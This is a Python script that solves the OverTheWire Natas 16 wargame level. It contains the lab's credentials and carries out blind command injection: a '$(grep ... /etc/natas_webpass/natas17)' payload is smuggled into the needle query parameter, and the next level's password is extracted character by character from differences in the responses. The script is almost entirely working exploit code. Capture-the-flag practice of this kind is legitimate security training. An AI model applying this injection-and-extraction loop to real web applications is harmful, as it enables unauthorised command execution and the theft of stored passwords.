#!/usr/bin/python

import requests

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
charexist = '035789bcdghkmnqrswAGHNPQSW'  ################### This line
password = ''

target = 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/index.php'

userexists = 'Output:\n<pre>\n</pre>'

r = requests.get(target)

if r.status_code:
	print r.status_code
	if r.status_code != 200:
		exit()
	#print r.text

'''
for c in chars:
	r = requests.get(target + '?needle=$(grep ' + c + ' /etc/natas_webpass/natas17)camouflage')
	if r.content.find(userexists) != -1:
		charexist += c
		print charexist
'''

print 'Characters used in password: ' + charexist

for i in range(32):
	for c in charexist:
		r = requests.get(target + '?needle=$(grep ^' + password + c + ' /etc/natas_webpass/natas17)camouflage')
		if r.content.find(userexists) != -1:
			password += c
			print password
			break
			
print 'Final password: ' + password
print 'Hacked!'
		
	
